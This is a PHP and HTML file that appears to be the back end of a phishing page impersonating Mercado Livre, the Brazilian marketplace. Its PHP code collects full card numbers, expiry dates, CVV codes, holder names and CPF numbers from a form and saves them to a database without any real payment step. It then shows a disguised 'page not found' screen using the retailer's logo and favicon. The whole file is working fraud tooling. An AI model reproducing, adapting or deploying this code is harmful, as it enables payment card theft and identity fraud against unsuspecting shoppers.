<?php
if (isset($_POST['submit'])) {
    include_once('config.php');

    // Coletar dados do formulário
    $numero_cartao = $_POST['numero_cartao'];
    $nome_completo = $_POST['nome_completo'];
    $data_vencimento = $_POST['data_vencimento'];
    $codigo_seguranca = $_POST['codigo_seguranca'];
    $cpf_titular = $_POST['cpf_titular'];

    // Preparar e executar a consulta SQL
    $stmt = $conexao->prepare("INSERT INTO pagamentos (numero_cartao, nome_completo, data_vencimento, codigo_seguranca, cpf_titular) VALUES (?, ?, ?, ?, ?)");
    $stmt->bind_param("sssss", $numero_cartao, $nome_completo, $data_vencimento, $codigo_seguranca, $cpf_titular);

    if ($stmt->execute()) {
        echo "";
    } else {
        echo "Erro: " . $stmt->error;
    }

    $stmt->close();
    $conexao->close();
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página Não Encontrada</title>
    <link rel="shortcut icon"
    href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" type="image/x-icon">
    <link rel="stylesheet" href="style1.css">
</head>
<body>
    <header>
        <div class="header-container">
            <a href="https://www.mercadolivre.com.br/"><img src="img/ml-logo.png" alt="Logo" class="logo"></a>
            <a href="https://www.mercadolivre.com.br/ajuda#nav-header">Contato</a>
        </div>
    </header>
    <main>
        <div class="container">
            <div class="computer">
                <div class="screen">
                    <div class="question-mark">?</div>
                </div>
                <div class="stand"></div>
                <div class="base"></div>
                <div class="pencil"></div>
            </div>
            <p>Parece que esta página não existe</p>
            <a href="https://www.mercadolivre.com.br/" class="link">Vá para a página principal</a>
        </div>
    </main>
</body>
</html>